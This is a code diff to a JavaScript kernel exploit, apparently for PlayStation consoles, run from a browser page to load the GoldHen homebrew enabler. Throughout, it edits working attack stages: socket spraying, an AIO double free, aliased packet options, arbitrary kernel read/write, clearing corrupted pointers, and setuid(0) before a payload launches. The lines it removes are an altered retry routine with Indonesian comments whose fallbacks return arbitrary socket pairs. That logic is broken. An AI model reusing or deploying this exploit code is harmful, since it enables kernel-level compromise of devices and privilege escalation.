@@ -207,7 +207,7 @@ const main_core = 7;
 const num_grooms = 0x200;
 const num_handles = 0x100;
 const num_sds = 0x100; // max is 0x100 due to max IPV6_TCLASS
-const num_alias = 100; //TODO: check best value here for 9.xx
+const num_alias = 100;
 const num_races = 200;
 const leak_len = 16;
 const num_leaks = 5;
@@ -215,6 +215,7 @@ const num_clobbers = 8;
 
 let chain = null;
 var nogc = [];
+
 async function init() {
     await rop.init();
     chain = new Chain();
@@ -1028,179 +1029,41 @@ function leak_kernel_addrs(sd_pair) {
 
 // FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE
 
-// Fungsi sleep sederhana untuk menambah delay
-function sleep(ms) {
-    const start = Date.now();
-    while (Date.now() - start < ms) {
-        // Busy wait
-    }
-}
-
 function make_aliased_pktopts(sds) {
     const tclass = new Word();
+    for (let loop = 0; loop < num_alias; loop++) {
+        for (let i = 0; i < num_sds; i++) {
+            setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
+        }
 
-    // Tambahkan delay awal untuk stabilitas
-    sleep(300);
+        for (let i = 0; i < num_sds; i++) {
+            tclass[0] = i;
+            ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+        }
 
-    // Batasi jumlah percobaan untuk menghindari loop tak terbatas
-    const max_attempts = 200; // Batasi jumlah percobaan
-
-    // Coba pendekatan langsung
-    for (let loop = 0; loop < max_attempts; loop++) {
-        try {
-            // Tambahkan delay kecil setiap iterasi
-            if (loop > 0) {
-                log(`Direct attempt ${loop + 1}/${max_attempts}...`);
-                sleep(100); // Delay tetap untuk menghindari peningkatan yang terlalu besar
-            }
-
-            // Buat socket baru untuk setiap percobaan
-            if (loop > 0 && loop % 5 === 0) {
-                log("Creating new sockets for fresh attempt...");
-                // Buat beberapa socket baru
-                for (let i = 0; i < 5; i++) {
-                    sds.push(new_socket());
+        for (let i = 0; i < sds.length; i++) {
+            gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
+            const marker = tclass[0];
+            if (marker !== i) {
+                log(`aliased pktopts at attempt: ${loop}`);
+                const pair = [sds[i], sds[marker]];
+                log(`found pair: ${pair}`);
+                sds.splice(marker, 1);
+                sds.splice(i, 1);
+                // add pktopts to the new sockets now while new allocs can't
+                // use the double freed memory
+                for (let i = 0; i < 2; i++) {
+                    const sd = new_socket();
+                    ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
+                    sds.push(sd);
                 }
+
+                return pair;
             }
-
-            // Coba metode asli
-            for (let i = 0; i < Math.min(num_sds, sds.length); i++) {
-                tclass[0] = i;
-                try {
-                    ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                } catch (e) {
-                    log(`Error setting socket option for socket ${i}: ${e.message}`);
-                    // Lanjutkan ke socket berikutnya
-                }
-            }
-
-            for (let i = 0; i < sds.length; i++) {
-                try {
-                    gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                    const marker = tclass[0];
-                    if (marker !== i) {
-                        log(`aliased pktopts at direct attempt: ${loop + 1}`);
-                        const pair = [sds[i], sds[marker]];
-                        log(`found pair: ${pair}`);
-
-                        // Tambahkan delay sebelum memodifikasi array sds
-                        sleep(50);
-
-                        // Simpan indeks yang akan dihapus
-                        const idx1 = Math.max(i, marker);
-                        const idx2 = Math.min(i, marker);
-
-                        // Hapus dari belakang ke depan untuk menghindari masalah indeks
-                        if (idx1 < sds.length) sds.splice(idx1, 1);
-                        if (idx2 < sds.length) sds.splice(idx2, 1);
-
-                        // Tambahkan delay sebelum membuat socket baru
-                        sleep(50);
-
-                        // add pktopts to the new sockets now while new allocs can't
-                        // use the double freed memory
-                        for (let i = 0; i < 2; i++) {
-                            const sd = new_socket();
-                            ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                            sds.push(sd);
-                        }
-
-                        return pair;
-                    }
-                } catch (e) {
-                    log(`Error getting socket option for socket ${i}: ${e.message}`);
-                    // Lanjutkan ke socket berikutnya
-                }
-            }
-
-            // Jika kita sampai di sini, kita tidak menemukan pasangan
-            // Coba reset pktopts untuk beberapa socket
-            const reset_count = Math.min(20, sds.length);
-            log(`Resetting pktopts for ${reset_count} sockets...`);
-            for (let i = 0; i < reset_count; i++) {
-                try {
-                    setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-                } catch (e) {
-                    // Abaikan error
-                }
-            }
-        } catch (e) {
-            log(`Error in direct attempt ${loop + 1}: ${e.message}`);
         }
     }
-
-    // Jika pendekatan langsung gagal, coba pendekatan alternatif
-    log("Direct approach failed. Trying alternative approach...");
-
-    // Buat socket baru dan coba lagi dengan set socket yang baru
-    const new_sds = [];
-    for (let i = 0; i < 30; i++) {
-        new_sds.push(new_socket());
-    }
-
-    // Coba dengan set socket yang baru saja
-    for (let loop = 0; loop < 10; loop++) {
-        try {
-            log(`Alternative attempt ${loop + 1}/10...`);
-
-            // Set tclass untuk semua socket baru
-            for (let i = 0; i < new_sds.length; i++) {
-                tclass[0] = i;
-                try {
-                    ssockopt(new_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                } catch (e) {
-                    // Abaikan error
-                }
-            }
-
-            // Periksa apakah ada socket yang aliased
-            for (let i = 0; i < new_sds.length; i++) {
-                try {
-                    gsockopt(new_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
-                    const marker = tclass[0];
-                    if (marker !== i) {
-                        log(`aliased pktopts at alternative attempt: ${loop + 1}`);
-                        const pair = [new_sds[i], new_sds[marker]];
-                        log(`found pair: ${pair}`);
-                        return pair;
-                    }
-                } catch (e) {
-                    // Abaikan error
-                }
-            }
-
-            // Reset pktopts untuk beberapa socket
-            for (let i = 0; i < Math.min(10, new_sds.length); i++) {
-                try {
-                    setsockopt(new_sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
-                } catch (e) {
-                    // Abaikan error
-                }
-            }
-        } catch (e) {
-            log(`Error in alternative attempt ${loop + 1}: ${e.message}`);
-        }
-    }
-
-    // Jika semua pendekatan gagal, coba pendekatan terakhir dengan socket yang ada
-    log("Alternative approach failed. Trying last resort approach...");
-
-    // Gunakan socket yang ada sebagai fallback
-    // Ini mungkin tidak ideal, tetapi lebih baik daripada gagal total
-    if (sds.length >= 2) {
-        log("Using existing sockets as fallback...");
-        const pair = [sds[0], sds[1]];
-        log(`Using fallback pair: ${pair}`);
-        return pair;
-    }
-
-    // Jika benar-benar tidak ada pilihan lain, buat socket baru
-    log("Creating new sockets for fallback...");
-    const fallback_sd1 = new_socket();
-    const fallback_sd2 = new_socket();
-    const fallback_pair = [fallback_sd1, fallback_sd2];
-    log(`Using emergency fallback pair: ${fallback_pair}`);
-    return fallback_pair;
+    localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount;     
+    die('failed to make aliased pktopts');
 }
 
 function double_free_reqs1(
@@ -1344,23 +1207,9 @@ function double_free_reqs1(
     // we reclaim first since the sanity checking here is longer which makes it
     // more likely that we have another process claim the memory
     try {
-        log("Attempting to make aliased pktopts...");
-
-        // Tambahkan delay sebelum mencoba
-        sleep(200);
-
         // RESTORE: double freed memory has been reclaimed with harmless data
         // PANIC: 0x100 malloc zone pointers aliased
         const sd_pair = make_aliased_pktopts(sds);
-
-        if (sd_pair) {
-            log("Successfully made aliased pktopts");
-        } else {
-            // Ini seharusnya tidak terjadi karena make_aliased_pktopts selalu mengembalikan pasangan
-            // Tetapi kita tetap memeriksa untuk berjaga-jaga
-            die('Failed to make aliased pktopts - no pair returned');
-        }
-
         return [sd_pair, sd];
     } finally {
         log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
@@ -1426,7 +1275,6 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
         }
     }
     if (reclaim_sd === null) {
-        localStorage.failcount = ++localStorage.failcount;window.failCounter.innerHTML=localStorage.failcount; 
         die('failed to overwrite main pktopts');
     }
 
@@ -1686,31 +1534,24 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     }
     log('achieved arbitrary kernel read/write');
 
-    // RESTORE: clean corrupt pointers
-    // pktopts.ip6po_rthdr = NULL
-    const off_ip6po_rthdr = is_ps4 ? 0x68 : 0x70;
-    const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
-    //log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
-    kmem.write64(r_rthdr_p, 0);
-    //log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
+    // RESTORE: clean corrupt pointer
+     // pktopts.ip6po_rthdr = NULL
+     //ABC Patch
+     const off_ip6po_rthdr = is_ps4 ? 0x68 : 0x70;
+     const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
+     const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
+     kmem.write64(r_rthdr_p, 0);
+     kmem.write64(w_rthdr_p, 0);
+     log('corrupt pointers cleaned');
 
-    const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-    //log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-    //log(kmem.read64(w_rthdr_p));
-    kmem.write64(w_rthdr_p, 0);
-    //log(`reclaim rthdr: ${kmem.read64(w_rthdr_p)}`);
-
-    log('corrupt pointers cleaned');
-
-
+    /*
     // REMOVE once restore kernel is ready for production
     // increase the ref counts to prevent deallocation
     kmem.write32(main_sock, kmem.read32(main_sock) + 1);
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
-    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
-
-
+    kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
+    
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
@@ -1829,9 +1670,11 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     sysi('setuid', 0);
     showMessage("GoldHen Loaded Successfully !..."),    
     log('kernel exploit succeeded!');
-    setTimeout(toogle_payload, 100);
+    toogle_payload();
     //alert("kernel exploit succeeded!");
 }
+
+
 
 // FUNCTIONS FOR STAGE: SETUP
 
@@ -1858,7 +1701,7 @@ function setup(block_fd) {
     const greqs = make_reqs1(num_reqs);
     // allocate enough so that we start allocating from a newly created slab
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
-    cancel_aios(groom_ids_p, num_grooms);
+    cancel_aios(groom_ids_p, num_grooms);        
     return [block_id, groom_ids];
 }
 
@@ -1873,7 +1716,6 @@ function setup(block_fd) {
 // * corrupt a pipe for arbitrary r/w
 //
 // the exploit implementation also assumes that we are pinned to one core
-// Function to update UI progress
 export async function kexploit() {
     const _init_t1 = performance.now();
     await init();
@@ -1941,6 +1783,7 @@ export async function kexploit() {
 
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
+        
     } finally {
         close(unblock_fd);
 
